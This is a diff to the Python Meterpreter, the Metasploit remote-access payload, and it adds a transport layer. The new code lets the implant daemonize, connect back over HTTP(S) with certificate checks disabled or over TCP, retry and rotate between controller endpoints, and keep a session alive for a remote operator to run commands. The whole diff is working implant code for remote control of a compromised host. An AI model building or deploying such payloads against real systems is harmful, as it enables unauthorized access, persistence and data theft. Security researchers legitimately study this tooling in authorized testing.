@@ -1,4 +1,6 @@
 #!/usr/bin/python
+# vim: tabstop=4 softtabstop=4 shiftwidth=4 noexpandtab
+import binascii
 import code
 import os
 import platform
@@ -47,10 +49,10 @@ if sys.version_info[0] < 3:
 else:
 	if isinstance(__builtins__, dict):
 		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
-		str = lambda x: __builtins__['str'](x, 'UTF-8')
+		str = lambda x: __builtins__['str'](x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
 	else:
 		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
-		str = lambda x: __builtins__.str(x, 'UTF-8')
+		str = lambda x: __builtins__.str(x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
 	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
 	NULL_BYTE = bytes('\x00', 'UTF-8')
 	long = int
@@ -60,14 +62,16 @@ else:
 # Constants
 #
 
-# these values may be patched, DO NOT CHANGE THEM
+# these values will be patched, DO NOT CHANGE THEM
 DEBUGGING = False
-HTTP_COMMUNICATION_TIMEOUT = 300
 HTTP_CONNECTION_URL = None
-HTTP_EXPIRATION_TIMEOUT = 604800
 HTTP_PROXY = None
 HTTP_USER_AGENT = None
-PAYLOAD_UUID = ""
+PAYLOAD_UUID = ''
+SESSION_COMMUNICATION_TIMEOUT = 300
+SESSION_EXPIRATION_TIMEOUT = 604800
+SESSION_RETRY_TOTAL = 3600
+SESSION_RETRY_WAIT = 10
 
 PACKET_TYPE_REQUEST        = 0
 PACKET_TYPE_RESPONSE       = 1
@@ -144,6 +148,19 @@ TLV_TYPE_TARGET_PATH           = TLV_META_TYPE_STRING  | 401
 TLV_TYPE_MIGRATE_PID           = TLV_META_TYPE_UINT    | 402
 TLV_TYPE_MIGRATE_LEN           = TLV_META_TYPE_UINT    | 403
 
+TLV_TYPE_TRANS_TYPE            = TLV_META_TYPE_UINT    | 430
+TLV_TYPE_TRANS_URL             = TLV_META_TYPE_STRING  | 431
+TLV_TYPE_TRANS_UA              = TLV_META_TYPE_STRING  | 432
+TLV_TYPE_TRANS_COMM_TIMEOUT    = TLV_META_TYPE_UINT    | 433
+TLV_TYPE_TRANS_SESSION_EXP     = TLV_META_TYPE_UINT    | 434
+TLV_TYPE_TRANS_CERT_HASH       = TLV_META_TYPE_RAW     | 435
+TLV_TYPE_TRANS_PROXY_HOST      = TLV_META_TYPE_STRING  | 436
+TLV_TYPE_TRANS_PROXY_USER      = TLV_META_TYPE_STRING  | 437
+TLV_TYPE_TRANS_PROXY_PASS      = TLV_META_TYPE_STRING  | 438
+TLV_TYPE_TRANS_RETRY_TOTAL     = TLV_META_TYPE_UINT    | 439
+TLV_TYPE_TRANS_RETRY_WAIT      = TLV_META_TYPE_UINT    | 440
+TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 441
+
 TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
 TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
 
@@ -211,6 +228,15 @@ def error_result_windows(error_number=None):
 	return result
 
 @export
+def get_hdd_label():
+	for _, _, files in os.walk('/dev/disk/by-id/'):
+		for f in files:
+			for p in ['ata-', 'mb-']:
+				if f[:len(p)] == p:
+					return f[len(p):]
+	return ''
+
+@export
 def inet_pton(family, address):
 	if hasattr(socket, 'inet_pton'):
 		return socket.inet_pton(family, address)
@@ -261,15 +287,17 @@ def tlv_pack(*args):
 		tlv = {'type':args[0], 'value':args[1]}
 	else:
 		tlv = args[0]
-	data = ""
+	data = ''
+	value = tlv['value']
 	if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
-		data = struct.pack('>III', 12, tlv['type'], tlv['value'])
+		if isinstance(value, float):
+			value = int(round(value))
+		data = struct.pack('>III', 12, tlv['type'], value)
 	elif (tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
-		data = struct.pack('>IIQ', 16, tlv['type'], tlv['value'])
+		data = struct.pack('>IIQ', 16, tlv['type'], value)
 	elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
-		data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(tlv['value']))), 'UTF-8')
+		data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(value))), 'UTF-8')
 	else:
-		value = tlv['value']
 		if sys.version_info[0] < 3 and value.__class__.__name__ == 'unicode':
 			value = value.encode('UTF-8')
 		elif not is_bytes(value):
@@ -283,6 +311,12 @@ def tlv_pack(*args):
 		elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
 			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
 	return data
+
+@export
+def tlv_pack_response(result, response):
+	response += tlv_pack(TLV_TYPE_RESULT, result)
+	response = struct.pack('>I', len(response) + 4) + response
+	return response
 
 #@export
 class MeterpreterFile(object):
@@ -371,50 +405,281 @@ class STDProcess(subprocess.Popen):
 				self.stdout_reader.read(len(channel_data))
 export(STDProcess)
 
-class PythonMeterpreter(object):
-	def __init__(self, socket=None):
+class Transport(object):
+	def __init__(self):
+		self.communication_timeout = SESSION_COMMUNICATION_TIMEOUT
+		self.communication_last = 0
+		self.retry_total = SESSION_RETRY_TOTAL
+		self.retry_wait = SESSION_RETRY_WAIT
+		self.request_retire = False
+
+	def __repr__(self):
+		return "<{0} url='{1}' >".format(self.__class__.__name__, self.url)
+
+	@property
+	def communication_has_expired(self):
+		return self.communication_last + self.communication_timeout < time.time()
+
+	@property
+	def should_retire(self):
+		return self.communication_has_expired or self.request_retire
+
+	@staticmethod
+	def from_request(request):
+		url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
+		if url.startswith('tcp'):
+			transport = TcpTransport(url)
+		elif url.startswith('http'):
+			proxy = packet_get_tlv(request, TLV_TYPE_TRANS_PROXY_HOST).get('value')
+			user_agent = packet_get_tlv(request, TLV_TYPE_TRANS_UA).get('value', HTTP_USER_AGENT)
+			transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
+		transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
+		transport.retry_total = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
+		transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
+		return transport
+
+	def _activate(self):
+		return True
+
+	def activate(self):
+		end_time = time.time() + self.retry_total
+		while time.time() < end_time:
+			try:
+				activate_succeeded = self._activate()
+			except:
+				activate_succeeded = False
+			if activate_succeeded:
+				self.communication_last = time.time()
+				return True
+			time.sleep(self.retry_wait)
+		return False
+
+	def _deactivate(self):
+		return
+
+	def deactivate(self):
+		try:
+			self._deactivate()
+		except:
+			pass
+		self.communication_last = 0
+		return True
+
+	def get_packet(self):
+		self.request_retire = False
+		try:
+			pkt = self._get_packet()
+		except:
+			return None
+		if pkt is None:
+			return None
+		self.communication_last = time.time()
+		return pkt
+
+	def send_packet(self, pkt):
+		self.request_retire = False
+		try:
+			self._send_packet(pkt)
+		except:
+			return False
+		self.communication_last = time.time()
+		return True
+
+	def tlv_pack_timeouts(self):
+		response  = tlv_pack(TLV_TYPE_TRANS_COMM_TIMEOUT, self.communication_timeout)
+		response += tlv_pack(TLV_TYPE_TRANS_RETRY_TOTAL, self.retry_total)
+		response += tlv_pack(TLV_TYPE_TRANS_RETRY_WAIT, self.retry_wait)
+		return response
+
+	def tlv_pack_transport_group(self):
+		trans_group  = tlv_pack(TLV_TYPE_TRANS_URL, self.url)
+		trans_group += self.tlv_pack_timeouts()
+		return trans_group
+
+class HttpTransport(Transport):
+	def __init__(self, url, proxy=None, user_agent=None):
+		super(HttpTransport, self).__init__()
+		opener_args = []
+		scheme = url.split(':', 1)[0]
+		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2, 7, 9)) or sys.version_info >= (3, 4, 3)):
+			import ssl
+			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+			ssl_ctx.check_hostname = False
+			ssl_ctx.verify_mode = ssl.CERT_NONE
+			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
+		if proxy:
+			opener_args.append(urllib.ProxyHandler({scheme: proxy}))
+		self.proxy = proxy
+		opener = urllib.build_opener(*opener_args)
+		if user_agent:
+			opener.addheaders = [('User-Agent', user_agent)]
+		self.user_agent = user_agent
+		urllib.install_opener(opener)
+		self.url = url
+		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
+		self._first_packet = None
+		self._empty_cnt = 0
+
+	def _activate(self):
+		return True
+		self._first_packet = None
+		packet = self._get_packet()
+		if packet is None:
+			return False
+		self._first_packet = packet
+		return True
+
+	def _get_packet(self):
+		if self._first_packet:
+			packet = self._first_packet
+			self._first_packet = None
+			return packet
+		packet = None
+		request = urllib.Request(self.url, bytes('RECV', 'UTF-8'), self._http_request_headers)
+		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
+		packet = url_h.read()
+		for _ in range(1):
+			if packet == '':
+				break
+			if len(packet) < 8:
+				packet = None  # looks corrupt
+				break
+			pkt_length, _ = struct.unpack('>II', packet[:8])
+			if len(packet) != pkt_length:
+				packet = None  # looks corrupt
+		if not packet:
+			delay = 10 * self._empty_cnt
+			if self._empty_cnt >= 0:
+				delay *= 10
+			self._empty_cnt += 1
+			time.sleep(float(min(10000, delay)) / 1000)
+			return packet
+		self._empty_cnt = 0
+		return packet[8:]
+
+	def _send_packet(self, packet):
+		request = urllib.Request(self.url, packet, self._http_request_headers)
+		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
+		response = url_h.read()
+
+	def tlv_pack_transport_group(self):
+		trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
+		if self.user_agent:
+			trans_group += tlv_pack(TLV_TYPE_TRANS_UA, self.user_agent)
+		if self.proxy:
+			trans_group += tlv_pack(TLV_TYPE_TRANS_PROXY_HOST, self.proxy)
+		return trans_group
+
+class TcpTransport(Transport):
+	def __init__(self, url, socket=None):
+		super(TcpTransport, self).__init__()
+		self.url = url
 		self.socket = socket
-		self.driver = None
+		self._cleanup_thread = None
+		self._first_packet = True
+
+	def _sock_cleanup(self, sock):
+		remaining_time = self.communication_timeout
+		while remaining_time > 0:
+			iter_start_time = time.time()
+			if select.select([sock], [], [], remaining_time)[0]:
+				if len(sock.recv(4096)) == 0:
+					break
+			remaining_time -= time.time() - iter_start_time
+		sock.close()
+
+	def _activate(self):
+		address, port = self.url[6:].rsplit(':', 1)
+		port = int(port.rstrip('/'))
+		timeout = max(self.communication_timeout, 30)
+		if address in ('', '0.0.0.0', '::'):
+			try:
+				server_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+				server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
+			except (AttributeError, socket.error):
+				server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			server_sock.bind(('', port))
+			server_sock.listen(1)
+			if not select.select([server_sock], [], [], timeout)[0]:
+				server_sock.close()
+				return False
+			sock, _ = server_sock.accept()
+			server_sock.close()
+		else:
+			if ':' in address:
+				sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+			else:
+				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.settimeout(timeout)
+			sock.connect((address, port))
+			sock.settimeout(None)
+		self.socket = sock
+		self._first_packet = True
+		return True
+
+	def _deactivate(self):
+		cleanup = threading.Thread(target=self._sock_cleanup, args=(self.socket,))
+		cleanup.run()
+		self.socket = None
+
+	def _get_packet(self):
+		first = self._first_packet
+		self._first_packet = False
+		if not select.select([self.socket], [], [], 0.5)[0]:
+			return ''
+		packet = self.socket.recv(8)
+		if packet == '':  # remote is closed
+			self.request_retire = True
+			return None
+		if len(packet) != 8:
+			if first and len(packet) == 4:
+				received = 0
+				pkt_length = struct.unpack('>I', packet)[0]
+				self.socket.settimeout(max(self.communication_timeout, 30))
+				while received < pkt_length:
+					received += len(self.socket.recv(pkt_length - received))
+				self.socket.settimeout(None)
+				return self._get_packet()
+			return None
+		pkt_length, pkt_type = struct.unpack('>II', packet)
+		pkt_length -= 8
+		packet = bytes()
+		while len(packet) < pkt_length:
+			packet += self.socket.recv(pkt_length - len(packet))
+		return packet
+
+	def _send_packet(self, packet):
+		self.socket.send(packet)
+
+	@classmethod
+	def from_socket(cls, sock):
+		url = 'tcp://'
+		address, port = sock.getsockname()[:2]
+		# this will need to be changed if the bind stager ever supports binding to a specific address
+		if not address in ('', '0.0.0.0', '::'):
+			address, port = sock.getpeername()[:2]
+		url += address + ':' + str(port)
+		return cls(url, sock)
+
+class PythonMeterpreter(object):
+	def __init__(self, transport):
+		self.transport = transport
 		self.running = False
-		self.communications_active = True
-		self.communications_last = 0
-		if self.socket:
-			self.driver = 'tcp'
-		elif HTTP_CONNECTION_URL:
-			self.driver = 'http'
 		self.last_registered_extension = None
 		self.extension_functions = {}
 		self.channels = {}
 		self.interact_channels = []
 		self.processes = {}
+		self.transports = [self.transport]
+		self.session_expiry_time = SESSION_EXPIRATION_TIMEOUT
+		self.session_expiry_end = time.time() + self.session_expiry_time
 		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
-		if self.driver:
-			if hasattr(self, 'driver_init_' + self.driver):
-				getattr(self, 'driver_init_' + self.driver)()
-			self.running = True
+		self.running = True
 
 	def debug_print(self, msg):
 		if DEBUGGING:
 			print(msg)
-
-	def driver_init_http(self):
-		opener_args = []
-		scheme = HTTP_CONNECTION_URL.split(':', 1)[0]
-		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2,7,9)) or sys.version_info >= (3,4,3)):
-			import ssl
-			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-			ssl_ctx.check_hostname=False
-			ssl_ctx.verify_mode=ssl.CERT_NONE
-			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
-		if HTTP_PROXY:
-			opener_args.append(urllib.ProxyHandler({scheme: HTTP_PROXY}))
-		opener = urllib.build_opener(*opener_args)
-		if HTTP_USER_AGENT:
-			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
-		urllib.install_opener(opener)
-		self._http_last_seen = time.time()
-		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
 
 	def register_extension(self, extension_name):
 		self.last_registered_extension = extension_name
@@ -445,121 +710,109 @@ class PythonMeterpreter(object):
 		return idx
 
 	def get_packet(self):
-		packet = getattr(self, 'get_packet_' + self.driver)()
-		self.communications_last = time.time()
-		if packet:
-			self.communications_active = True
-		return packet
+		pkt = self.transport.get_packet()
+		if pkt is None and self.transport.should_retire:
+			self.transport_change()
+		return pkt
 
 	def send_packet(self, packet):
-		getattr(self, 'send_packet_' + self.driver)(packet)
-		self.communications_last = time.time()
-		self.communications_active = True
+		send_succeeded = self.transport.send_packet(packet)
+		if not send_succeeded and self.transport.should_retire:
+			self.transport_change()
+		return send_succeeded
 
-	def get_packet_http(self):
-		packet = None
-		request = urllib.Request(HTTP_CONNECTION_URL, bytes('RECV', 'UTF-8'), self._http_request_headers)
-		try:
-			url_h = urllib.urlopen(request)
-			packet = url_h.read()
-		except:
-			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
-				self.running = False
-		else:
-			self._http_last_seen = time.time()
-		if packet:
-			packet = packet[8:]
-		else:
-			packet = None
-		return packet
+	@property
+	def session_has_expired(self):
+		if self.session_expiry_time == 0:
+			return False
+		return time.time() > self.session_expiry_end
 
-	def send_packet_http(self, packet):
-		request = urllib.Request(HTTP_CONNECTION_URL, packet, self._http_request_headers)
-		try:
-			url_h = urllib.urlopen(request)
-			response = url_h.read()
-		except:
-			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
-				self.running = False
-		else:
-			self._http_last_seen = time.time()
+	def transport_add(self, new_transport):
+		new_position = self.transports.index(self.transport)
+		self.transports.insert(new_position, new_transport)
 
-	def get_packet_tcp(self):
-		packet = None
-		if len(select.select([self.socket], [], [], 0.5)[0]):
-			packet = self.socket.recv(8)
-			if len(packet) != 8:
-				self.running = False
-				return None
-			pkt_length, pkt_type = struct.unpack('>II', packet)
-			pkt_length -= 8
-			packet = bytes()
-			while len(packet) < pkt_length:
-				packet += self.socket.recv(pkt_length - len(packet))
-		return packet
+	def transport_change(self, new_transport=None):
+		if new_transport is None:
+			new_transport = self.transport_next()
+		self.transport.deactivate()
+		self.debug_print('[*] changing transport to: ' + new_transport.url)
+		while not new_transport.activate():
+			new_transport = self.transport_next(new_transport)
+			self.debug_print('[*] changing transport to: ' + new_transport.url)
+		self.transport = new_transport
 
-	def send_packet_tcp(self, packet):
-		self.socket.send(packet)
+	def transport_next(self, current_transport=None):
+		if current_transport is None:
+			current_transport = self.transport
+		new_idx = self.transports.index(current_transport) + 1
+		if new_idx == len(self.transports):
+			new_idx = 0
+		return self.transports[new_idx]
+
+	def transport_prev(self, current_transport=None):
+		if current_transport is None:
+			current_transport = self.transport
+		new_idx = self.transports.index(current_transport) - 1
+		if new_idx == -1:
+			new_idx = len(self.transports) - 1
+		return self.transports[new_idx]
 
 	def run(self):
-		while self.running:
-			request = None
-			should_get_packet = self.communications_active or ((time.time() - self.communications_last) > 0.5)
-			self.communications_active = False
-			if should_get_packet:
-				request = self.get_packet()
+		while self.running and not self.session_has_expired:
+			request = self.get_packet()
 			if request:
 				response = self.create_response(request)
-				self.send_packet(response)
-			else:
-				# iterate over the keys because self.channels could be modified if one is closed
-				channel_ids = list(self.channels.keys())
-				for channel_id in channel_ids:
-					channel = self.channels[channel_id]
-					data = bytes()
-					if isinstance(channel, STDProcess):
-						if not channel_id in self.interact_channels:
-							continue
-						if channel.stderr_reader.is_read_ready():
-							data = channel.stderr_reader.read()
-						elif channel.stdout_reader.is_read_ready():
-							data = channel.stdout_reader.read()
-						elif channel.poll() != None:
+				if response:
+					self.send_packet(response)
+				continue
+			# iterate over the keys because self.channels could be modified if one is closed
+			channel_ids = list(self.channels.keys())
+			for channel_id in channel_ids:
+				channel = self.channels[channel_id]
+				data = bytes()
+				if isinstance(channel, STDProcess):
+					if not channel_id in self.interact_channels:
+						continue
+					if channel.stderr_reader.is_read_ready():
+						data = channel.stderr_reader.read()
+					elif channel.stdout_reader.is_read_ready():
+						data = channel.stdout_reader.read()
+					elif channel.poll() != None:
+						self.handle_dead_resource_channel(channel_id)
+				elif isinstance(channel, MeterpreterSocketClient):
+					while select.select([channel.fileno()], [], [], 0)[0]:
+						try:
+							d = channel.recv(1)
+						except socket.error:
+							d = bytes()
+						if len(d) == 0:
 							self.handle_dead_resource_channel(channel_id)
-					elif isinstance(channel, MeterpreterSocketClient):
-						while len(select.select([channel.fileno()], [], [], 0)[0]):
-							try:
-								d = channel.recv(1)
-							except socket.error:
-								d = bytes()
-							if len(d) == 0:
-								self.handle_dead_resource_channel(channel_id)
-								break
-							data += d
-					elif isinstance(channel, MeterpreterSocketServer):
-						if len(select.select([channel.fileno()], [], [], 0)[0]):
-							(client_sock, client_addr) = channel.accept()
-							server_addr = channel.getsockname()
-							client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
-							pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
-							pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
-							pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
-							pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
-							pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
-							pkt += tlv_pack(TLV_TYPE_LOCAL_PORT, server_addr[1])
-							pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
-							pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
-							pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-							self.send_packet(pkt)
-					if data:
+							break
+						data += d
+				elif isinstance(channel, MeterpreterSocketServer):
+					if select.select([channel.fileno()], [], [], 0)[0]:
+						(client_sock, client_addr) = channel.accept()
+						server_addr = channel.getsockname()
+						client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
 						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
-						pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
-						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
-						pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
-						pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
-						pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
+						pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
+						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
+						pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
+						pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
+						pkt += tlv_pack(TLV_TYPE_LOCAL_PORT, server_addr[1])
+						pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
+						pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
 						pkt  = struct.pack('>I', len(pkt) + 4) + pkt
 						self.send_packet(pkt)
+				if data:
+					pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
+					pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
+					pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
+					pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
+					pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
+					pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
+					pkt  = struct.pack('>I', len(pkt) + 4) + pkt
+					self.send_packet(pkt)
 
 	def handle_dead_resource_channel(self, channel_id):
 		del self.channels[channel_id]
@@ -573,18 +826,17 @@ class PythonMeterpreter(object):
 		self.send_packet(pkt)
 
 	def _core_uuid(self, request, response):
-		response += tlv_pack(TLV_TYPE_UUID, PAYLOAD_UUID)
+		response += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+		return ERROR_SUCCESS, response
+
+	def _core_enumextcmd(self, request, response):
+		extension_name = packet_get_tlv(request, TLV_TYPE_STRING)['value']
+		for func_name in self.extension_functions.keys():
+			if func_name.split('_', 1)[0] == extension_name:
+				response += tlv_pack(TLV_TYPE_STRING, func_name)
 		return ERROR_SUCCESS, response
 
 	def _core_machine_id(self, request, response):
-		def get_hdd_label():
-			for _, _, files in os.walk('/dev/disk/by-id/'):
-				for f in files:
-					for p in ['ata-', 'mb-']:
-						if f[:len(p)] == p:
-							return f[len(p):]
-			return ""
-
 		serial = ''
 		machine_name = platform.uname()[1]
 		if has_windll:
@@ -634,6 +886,89 @@ class PythonMeterpreter(object):
 		response += tlv_pack(TLV_TYPE_BOOL, True)
 		self.running = False
 		return ERROR_SUCCESS, response
+
+	def _core_transport_add(self, request, response):
+		new_transport = Transport.from_request(request)
+		self.transport_add(new_transport)
+		return ERROR_SUCCESS, response
+
+	def _core_transport_change(self, request, response):
+		new_transport = Transport.from_request(request)
+		self.transport_add(new_transport)
+		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+		self.transport_change(new_transport)
+		return None
+
+	def _core_transport_list(self, request, response):
+		if self.session_expiry_time > 0:
+			response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
+		response += tlv_pack(TLV_TYPE_TRANS_GROUP, self.transport.tlv_pack_transport_group())
+
+		transport = self.transport_next()
+		while transport != self.transport:
+			response += tlv_pack(TLV_TYPE_TRANS_GROUP, transport.tlv_pack_transport_group())
+			transport = self.transport_next(transport)
+		return ERROR_SUCCESS, response
+
+	def _core_transport_next(self, request, response):
+		new_transport = self.transport_next()
+		if new_transport == self.transport:
+			return ERROR_FAILURE, response
+		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+		self.transport_change(new_transport)
+		return None
+
+	def _core_transport_prev(self, request, response):
+		new_transport = self.transport_prev()
+		if new_transport == self.transport:
+			return ERROR_FAILURE, response
+		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+		self.transport_change(new_transport)
+		return None
+
+	def _core_transport_remove(self, request, response):
+		url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
+		if self.transport.url == url:
+			return ERROR_FAILURE, response
+		transport_found = False
+		for transport in self.transports:
+			if transport.url == url:
+				transport_found = True
+				break
+		if transport_found:
+			self.transports.remove(transport)
+			return ERROR_SUCCESS, response
+		return ERROR_FAILURE, response
+
+	def _core_transport_set_timeouts(self, request, response):
+		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_SESSION_EXP).get('value')
+		if not timeout_value is None:
+			self.session_expiry_time = timeout_value
+			self.session_expiry_end = time.time() + self.session_expiry_time
+		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value')
+		if timeout_value:
+			self.transport.communication_timeout = timeout_value
+		retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value')
+		if retry_value:
+			self.transport.retry_total = retry_value
+		retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value')
+		if retry_value:
+			self.transport.retry_wait = retry_value
+
+		if self.session_expiry_time > 0:
+			response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
+		response += self.transport.tlv_pack_timeouts()
+		return ERROR_SUCCESS, response
+
+	def _core_transport_sleep(self, request, response):
+		seconds = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT)['value']
+		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+		if seconds:
+			self.transport.deactivate()
+			time.sleep(seconds)
+			if not self.transport.activate():
+				self.transport_change()
+		return None
 
 	def _core_channel_open(self, request, response):
 		channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
@@ -748,7 +1083,10 @@ class PythonMeterpreter(object):
 			handler = self.extension_functions[handler_name]
 			try:
 				self.debug_print('[*] running method ' + handler_name)
-				result, resp = handler(request, resp)
+				result = handler(request, resp)
+				if result is None:
+					return
+				result, resp = result
 			except Exception:
 				self.debug_print('[-] method ' + handler_name + ' resulted in an error')
 				if DEBUGGING:
@@ -757,9 +1095,7 @@ class PythonMeterpreter(object):
 		else:
 			self.debug_print('[-] method ' + handler_name + ' was requested but does not exist')
 			result = error_result(NotImplementedError)
-		resp += tlv_pack(TLV_TYPE_RESULT, result)
-		resp = struct.pack('>I', len(resp) + 4) + resp
-		return resp
+		return tlv_pack_response(result, resp)
 
 if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 	if hasattr(os, 'setsid'):
@@ -768,7 +1104,8 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 		except OSError:
 			pass
 	if HTTP_CONNECTION_URL and has_urllib:
-		met = PythonMeterpreter()
+		transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT)
 	else:
-		met = PythonMeterpreter(s)
+		transport = TcpTransport.from_socket(s)
+	met = PythonMeterpreter(transport)
 	met.run()
